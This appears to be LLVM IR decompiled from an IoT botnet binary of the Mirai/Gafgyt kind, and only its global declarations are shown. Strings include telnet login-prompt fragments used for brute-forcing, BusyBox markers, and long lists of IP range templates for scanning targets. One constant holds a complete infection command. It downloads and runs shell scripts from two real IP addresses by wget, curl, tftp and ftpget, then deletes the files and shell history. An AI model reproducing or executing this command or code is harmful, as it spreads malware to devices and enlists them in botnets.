source_filename = "test"
target datalayout = "e-m:e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%rusage = type { %timeval, %timeval, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }
%timeval = type { i32, i32 }
%timespec = type { i32, i32 }
%sigcontext = type { i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%pollfd = type { i32, i16, i16 }

@df = internal unnamed_addr global i1 false
@eax = internal unnamed_addr global i32 0
@ecx = internal unnamed_addr global i32 0
@edx = internal unnamed_addr global i32 0
@ebx = internal unnamed_addr global i32 0
@esp = internal unnamed_addr global i32 0
@ebp = internal unnamed_addr global i32 0
@esi = internal unnamed_addr global i32 0
@edi = internal unnamed_addr global i32 0
@0 = external global i32
@global_var_805d00c.2 = global i32 0
@global_var_805d024.3 = local_unnamed_addr global i32* @global_var_805d00c.2
@global_var_805d8e0.5 = global i32 0
@global_var_805d8e4.6 = local_unnamed_addr global i32 0
@global_var_805d8e8.7 = local_unnamed_addr global i32 0
@global_var_805d614.8 = local_unnamed_addr global i32 4095
@global_var_805d610.9 = local_unnamed_addr global i32 362436
@global_var_8056df2.10 = constant [8 x i8] c"BusyBox\00"
@global_var_8056df0.12 = constant i32 1967259683
@global_var_8056dfa.13 = constant [6 x i8] c"shell\00"
@global_var_8056e00.14 = constant [7 x i8] c"dvrdvs\00"
@global_var_805d120.15 = global [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056df2.10, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_8056dee.11 to i8*), i8* bitcast (i32* @global_var_8056df0.12 to i8*), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056dfa.13, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056e00.14, i32 0, i32 0)]
@global_var_8056dba.16 = constant [7 x i8] c"nvalid\00"
@global_var_8056dc1.17 = constant [6 x i8] c"ailed\00"
@global_var_8056dc7.18 = constant [9 x i8] c"ncorrect\00"
@global_var_8056dd0.19 = constant [6 x i8] c"enied\00"
@global_var_8056dd6.20 = constant [5 x i8] c"rror\00"
@global_var_8056ddb.21 = constant [7 x i8] c"oodbye\00"
@global_var_8056de2.22 = constant [4 x i8] c"bad\00"
@global_var_805d100.23 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056dba.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056dc1.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056dc7.18, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056dd0.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056dd6.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056ddb.21, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056de2.22, i32 0, i32 0)]
@global_var_8059ad8.24 = constant [7 x i8] c"(null)\00"
@global_var_8059adf.26 = constant [3 x i8] c"-c\00"
@global_var_8059597.27 = constant [3 x i8] c"sh\00"
@global_var_8059ae2.28 = constant [8 x i8] c"/bin/sh\00"
@global_var_8059b00.29 = constant i32 -1
@global_var_8059f00.30 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_8059f0e.31 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_805d8c0.32 = local_unnamed_addr global i32 0
@global_var_8059f17.33 = constant [5 x i8] c"PING\00"
@global_var_8059f1c.34 = constant [14 x i8] c"gethostbyname\00"
@global_var_805d8c8.35 = local_unnamed_addr global i32 0
@global_var_805d8cc.36 = local_unnamed_addr global i32 0
@global_var_8063b54.37 = local_unnamed_addr global i32 0
@global_var_8059f2a.38 = constant [6 x i8] c":>%$#\00"
@global_var_805d8d7.39 = local_unnamed_addr global i32 0
@global_var_805d8d8.40 = local_unnamed_addr global i32 0
@global_var_8059f31.43 = constant [11 x i8] c"1.10.%d.%d\00"
@global_var_8059f3c.44 = constant [12 x i8] c"1.120.%d.%d\00"
@global_var_8059f48.45 = constant [12 x i8] c"5.140.%d.%d\00"
@global_var_8059f54.46 = constant [12 x i8] c"5.141.%d.%d\00"
@global_var_8059f60.47 = constant [12 x i8] c"122.2.%d.%d\00"
@global_var_8059f6c.48 = constant [12 x i8] c"122.3.%d.%d\00"
@global_var_8059f78.49 = constant [13 x i8] c"122.53.%d.%d\00"
@global_var_8059f85.50 = constant [13 x i8] c"122.54.%d.%d\00"
@global_var_8059f92.51 = constant [13 x i8] c"188.16.%d.%d\00"
@global_var_8059f9f.52 = constant [13 x i8] c"188.17.%d.%d\00"
@global_var_8059fac.53 = constant [13 x i8] c"188.18.%d.%d\00"
@global_var_8059fb9.54 = constant [13 x i8] c"188.19.%d.%d\00"
@global_var_8059fc6.55 = constant [13 x i8] c"31.162.%d.%d\00"
@global_var_8059fd3.56 = constant [13 x i8] c"31.163.%d.%d\00"
@global_var_8059fe0.57 = constant [12 x i8] c"5.142.%d.%d\00"
@global_var_8059fec.58 = constant [12 x i8] c"5.143.%d.%d\00"
@global_var_8059ff8.59 = constant [13 x i8] c"90.150.%d.%d\00"
@global_var_805a005.60 = constant [13 x i8] c"90.151.%d.%d\00"
@global_var_805a012.61 = constant [13 x i8] c"178.47.%d.%d\00"
@global_var_805a01f.62 = constant [12 x i8] c"94.50.%d.%d\00"
@global_var_805a02b.63 = constant [12 x i8] c"94.51.%d.%d\00"
@global_var_805a037.64 = constant [13 x i8] c"190.43.%d.%d\00"
@global_var_805a044.65 = constant [12 x i8] c"210.5.%d.%d\00"
@global_var_805a050.66 = constant [14 x i8] c"210.213.%d.%d\00"
@global_var_805a05e.67 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_805a069.68 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_805a074.69 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_805a080.70 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_805a08c.71 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_805a098.72 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_805a0a5.73 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_805a0b2.74 = constant [14 x i8] c"186.128.%d.%d\00"
@global_var_805a0c0.75 = constant [14 x i8] c"186.132.%d.%d\00"
@global_var_805a0ce.76 = constant [13 x i8] c"186.39.%d.%d\00"
@global_var_805a0db.77 = constant [13 x i8] c"186.56.%d.%d\00"
@global_var_805a0e8.78 = constant [13 x i8] c"186.57.%d.%d\00"
@global_var_805a0f5.79 = constant [13 x i8] c"186.58.%d.%d\00"
@global_var_805a102.80 = constant [13 x i8] c"186.60.%d.%d\00"
@global_var_805a10f.81 = constant [13 x i8] c"46.181.%d.%d\00"
@global_var_805a11c.82 = constant [13 x i8] c"46.180.%d.%d\00"
@global_var_805a129.83 = constant [14 x i8] c"188.173.%d.%d\00"
@global_var_805a137.84 = constant [13 x i8] c"64.137.%d.%d\00"
@global_var_805a144.85 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_805a151.86 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_805a15e.87 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_805a16b.88 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_805a178.89 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_805a185.90 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_805a193.91 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_805a1a0.92 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_805a1ae.93 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_805a1bc.94 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_805a1ca.95 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_805a1d8.96 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_805a1e5.97 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_805a1f3.98 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_805a201.99 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_805a20f.100 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_805a21d.101 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_805a22b.102 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_805a239.103 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_805a246.104 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_805a254.105 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_805a262.106 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_805a270.107 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_805a27d.108 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_805a28a.109 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_805a297.110 = constant [12 x i8] c"98.27.%d.%d\00"
@global_var_805a2a3.111 = constant [13 x i8] c"98.179.%d.%d\00"
@global_var_805a2b0.112 = constant [13 x i8] c"98.113.%d.%d\00"
@global_var_805a2bd.113 = constant [13 x i8] c"98.121.%d.%d\00"
@global_var_805a2ca.114 = constant [13 x i8] c"98.100.%d.%d\00"
@global_var_805a2d7.115 = constant [13 x i8] c"98.161.%d.%d\00"
@global_var_805a2e4.116 = constant [13 x i8] c"98.165.%d.%d\00"
@global_var_805a2f1.117 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_805a2fd.118 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_805a30b.119 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_805a316.120 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_805a323.121 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_805a32e.122 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_805a33b.123 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_805a347.124 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_805a354.125 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_805a361.126 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_805a36e.127 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_805a37c.128 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_805a387.129 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_805a394.130 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_805a3a1.131 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_805a3ae.132 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_805a3bb.133 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_805a3c6.134 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_805a3d2.135 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_805a3df.136 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_805a3eb.137 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_805a3f8.138 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_805a404.139 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_805a40f.140 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_805a41b.141 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_805a427.142 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_805a433.143 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_805a43f.144 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_805a44b.145 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_805a458.146 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_805a465.147 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_805a472.148 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_805a47f.149 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_805a48c.150 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_805a499.151 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_805a4a6.152 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_805a4b3.153 = constant [12 x i8] c"77.96.%d.%d\00"
@global_var_805a4bf.154 = constant [12 x i8] c"77.97.%d.%d\00"
@global_var_805a4cb.155 = constant [12 x i8] c"77.98.%d.%d\00"
@global_var_805a4d7.156 = constant [13 x i8] c"77.100.%d.%d\00"
@global_var_805a4e4.157 = constant [13 x i8] c"77.102.%d.%d\00"
@global_var_805a4f1.158 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_805a4ff.159 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_805a50c.160 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_805a51a.161 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_805a528.162 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_805a535.163 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_805a542.164 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_805a54f.165 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_805a55c.166 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_805a569.167 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_805a576.168 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_805a583.169 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_805a590.170 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_805a59d.171 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_805a5aa.172 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_805a5b7.173 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_805a5c4.174 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_805a5d1.175 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_805a5de.176 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_805a5eb.177 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_805a5f8.178 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_805a605.179 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_805a612.180 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_805a61f.181 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_805a62c.182 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_805a639.183 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_805a646.184 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_805a653.185 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_805a660.186 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_805a66d.187 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_805a67a.188 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_805a687.189 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_805a694.190 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_805a6a1.191 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_805a6ae.192 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_805a6bb.193 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_805a6c8.194 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_805a6d5.195 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_805a6e2.196 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_805a6ef.197 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_805a6fc.198 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_805a709.199 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_805a716.200 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_805a723.201 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_805a730.202 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_805a73d.203 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_805a74a.204 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_805a756.205 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_805a763.206 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_805a770.207 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_805a77d.208 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_805a789.209 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_805a796.210 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_805a7a4.211 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_805a7b2.212 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_805a7bf.213 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_805a7cd.214 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_805a7db.215 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_805a7e8.216 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_805a7f6.217 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_805a803.218 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_805a811.219 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_805a81f.220 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_805a82d.221 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_805a83b.222 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_805a848.223 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_805a854.224 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_805a862.225 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_805a870.226 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_805a87e.227 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_805a88c.228 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_805a89a.229 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_805a8a8.230 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_805a8b6.231 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_805a8c4.232 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_805a8d2.233 = constant [14 x i8] c"116.167.%d.%d\00"
@global_var_805a8e0.234 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_805a8ee.235 = constant [13 x i8] c"113.17.%d.%d\00"
@global_var_805a8fb.236 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_805a908.237 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_805a915.238 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_805a922.239 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_805a92f.240 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_805a93c.241 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_805a94a.242 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_805a958.243 = constant [14 x i8] c"222.225.%d.%d\00"
@global_var_805a966.244 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_805a973.245 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_805a980.246 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_805a98e.247 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_805a99c.248 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_805a9a9.249 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_805a9b6.250 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_805a9c3.251 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_805a9d0.252 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_805a9dd.253 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_805a9e9.254 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_805a9f6.255 = constant [14 x i8] c"103.233.%d.%d\00"
@global_var_805aa04.256 = constant [13 x i8] c"103.63.%d.%d\00"
@global_var_805aa11.257 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_805aa1e.258 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_805aa2b.259 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_805aa38.260 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_805aa45.261 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_805aa53.262 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_805aa61.263 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_805aa6f.264 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_805aa7d.265 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_805aa8b.266 = constant [14 x i8] c"202.134.%d.%d\00"
@global_var_805aa99.267 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_805aaa6.268 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_805aab3.269 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_805aac1.270 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_805aacf.271 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_805aadd.272 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_805aaeb.273 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_805aaf9.274 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_805ab07.275 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_805ab15.276 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_805ab23.277 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_805ab30.278 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_805ab3d.279 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_805ab4a.280 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_805ab57.281 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_805ab64.282 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_805ab71.283 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_805ab7f.284 = constant [13 x i8] c"50.233.%d.%d\00"
@global_var_805ab8c.285 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_805ab99.286 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_805aba6.287 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_805abb3.288 = constant [13 x i8] c"111.26.%d.%d\00"
@global_var_805abc0.289 = constant [13 x i8] c"111.20.%d.%d\00"
@global_var_8063b48.290 = local_unnamed_addr global i32 0
@global_var_805d094 = external global i32
@global_var_805abcd.295 = constant [3 x i8] c"\0D\0A\00"
@global_var_8056de6.296 = constant [8 x i8] c"busybox\00"
@global_var_805d0c0.297 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056dba.16, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056dc1.17, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056dc7.18, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056dd0.19, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056dd6.20, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056ddb.21, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056de2.22, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056de6.296, i32 0, i32 0), i8* bitcast ([10 x i8*]* @global_var_8056dee.11 to i8*), i8* bitcast (i32* @global_var_8056df0.12 to i8*)]
@global_var_805abd0.298 = constant i32 926112539
@global_var_805ac10.299 = constant [485 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://185.101.107.128/bins.sh; curl -O http://185.158.113.30/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 185.158.113.30 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 185.158.113.30; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 185.158.113.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *;history -c;history -w;rm -rf ~/.bash_history\0D\0A\00"
@global_var_805d61c = external local_unnamed_addr global i32
@global_var_805d680.302 = global i32 288
@global_var_805d6d0.303 = local_unnamed_addr global i32 272
@global_var_8063b20.305 = global i32 0
@global_var_805b5c0.306 = constant i32 0
@global_var_805d640.307 = global i32 0
@global_var_805d658.308 = global i32 0
@global_var_805d63c.309 = global i32* @global_var_805d680.302
@global_var_805b5d8.310 = constant [6 x i8] c"(nil)\00"
@global_var_805b5de.311 = constant [7 x i8] c"(null)\00"
@global_var_805b5e5.312 = constant i32 2949163
@global_var_805b652.314 = constant i32 327688
@global_var_805b64a.315 = constant [8 x i8] c" +0-#'I\00"
@global_var_805b5f8.316 = constant [9 x i8] c"hlLjztqZ\00"
@global_var_805b635.317 = constant [21 x i8] c"npxXoudifFeEgGaACScs\00"
@global_var_805b62b.318 = constant i32 117506048
@global_var_805b61c.319 = constant i32 331776
@global_var_805b6a0.320 = constant [8 x i8] c"Success\00"
@global_var_805b676.321 = constant [15 x i8] c"Unknown error \00"
@global_var_805c640.322 = constant i32 65536
@global_var_805d880.323 = local_unnamed_addr global i32* @global_var_805c640.322
@global_var_805c28b.324 = constant [3 x i8] c": \00"
@global_var_805c28d.325 = constant i32 0
@global_var_805c27c.326 = constant [15 x i8] c"Resolver error\00"
@global_var_805c202.327 = constant [8 x i8] c"Error 0\00"
@global_var_805c20a.328 = constant [13 x i8] c"Unknown host\00"
@global_var_805c217.329 = constant [25 x i8] c"Host name lookup failure\00"
@global_var_805c230.330 = constant [21 x i8] c"Unknown server error\00"
@global_var_805c245.331 = constant [32 x i8] c"No address associated with name\00"
@global_var_805c268.332 = constant [5 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_805c202.327, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_805c20a.328, i32 0, i32 0), i8* getelementptr inbounds ([25 x i8], [25 x i8]* @global_var_805c217.329, i32 0, i32 0), i8* getelementptr inbounds ([21 x i8], [21 x i8]* @global_var_805c230.330, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_805c245.331, i32 0, i32 0)]
@global_var_805c1fa.333 = constant [8 x i8] c"%s%s%s\0A\00"
@global_var_8063904.334 = global i32 0
@global_var_8063920.335 = global i32 0
@global_var_8063aec.336 = global i32 0
@global_var_805d888.337 = global i32 0
@global_var_8063f74.338 = local_unnamed_addr global i32 0
@global_var_8063f68.339 = global i32 0
@global_var_805d770.340 = global i32 0
@global_var_8063c0c.342 = global i32 0
@global_var_8063c10.343 = local_unnamed_addr global i32 0
@global_var_8063c14.344 = global i32 0
@global_var_8063c20.345 = local_unnamed_addr global i32 0
@global_var_8063f14.346 = global i32 0
@global_var_8063f3c.347 = local_unnamed_addr global i32 0
@global_var_8063f2c.348 = local_unnamed_addr global i32 0
@global_var_8063f30.349 = local_unnamed_addr global i32 0
@global_var_8063f34.350 = local_unnamed_addr global i32 0
@global_var_8063f38.351 = local_unnamed_addr global i32 0
@global_var_8063f44.352 = local_unnamed_addr global i32 0
@global_var_8063f50.353 = local_unnamed_addr global i32 0
@global_var_8063f48.354 = local_unnamed_addr global i32 0
@global_var_8063f54.355 = local_unnamed_addr global i32 0
@global_var_8063f28.356 = local_unnamed_addr global i32 0
@global_var_8063f24.358 = local_unnamed_addr global i32 0
@global_var_8063f4c.359 = local_unnamed_addr global i32 0
@global_var_8063c1c.360 = local_unnamed_addr global i32 0
@global_var_805d788.361 = global i32 0
@global_var_805d7a0.363 = global i32 0
@global_var_805d7b8 = external global i32
@global_var_805d7e4.365 = global i32 -1726662223
@global_var_805d7c0.366 = local_unnamed_addr global i32* @global_var_805d7e4.365
@global_var_805d7bc.367 = global i32* @global_var_805d7e4.365
@global_var_805c2b4.368 = constant i32 0
@global_var_805c2a0.369 = constant i32 0
@global_var_805d860.370 = global i32 0
@global_var_8063b04.371 = local_unnamed_addr global i32 0
@global_var_8063b0c.372 = local_unnamed_addr global i32 0
@global_var_805d000.374 = global i32 -1
@global_var_80535ab.375 = constant i32 -294069
@global_var_8063b14.376 = local_unnamed_addr global i32 0
@global_var_8063b18.377 = local_unnamed_addr global i32 0
@global_var_805c52c.378 = constant [10 x i8] c"/dev/null\00"
@global_var_8063b10.380 = local_unnamed_addr global i32 0
@global_var_8063b08.381 = local_unnamed_addr global i32 0
@global_var_8053791.383 = constant i32 1928542531
@global_var_80537b5.384 = constant i32 1928542531
@global_var_8063b44.385 = local_unnamed_addr global i32 0
@global_var_8063b24.386 = global i32 0
@global_var_805c850.388 = constant [4 x i8] c"inf\00"
@global_var_805c853.393 = constant i32 1179535616
@global_var_805c860.394 = constant i32 2883630
@global_var_8063b28.395 = global i32 0
@global_var_8063f78.398 = local_unnamed_addr global i32 0
@global_var_805c91c.399 = constant i32 1697579054
@global_var_805c950.400 = constant i32 1868824690
@global_var_805c91e.401 = constant [17 x i8] c"/etc/resolv.conf\00"
@global_var_805c92f.402 = constant [24 x i8] c"/etc/config/resolv.conf\00"
@global_var_805c947.403 = constant [11 x i8] c"nameserver\00"
@global_var_805c952.404 = constant [7 x i8] c"domain\00"
@global_var_805c959.405 = constant [7 x i8] c"search\00"
@global_var_8063f58.406 = global i32 0
@global_var_8063f7c.407 = local_unnamed_addr global i32 0
@global_var_8063f80.408 = local_unnamed_addr global i32 0
@global_var_80618e4.409 = local_unnamed_addr global i32 0
@global_var_80618e8.410 = local_unnamed_addr global i32 0
@global_var_805d670.411 = local_unnamed_addr global i32 2
@global_var_805c974.412 = constant [17 x i8] c"0123456789abcdef\00"
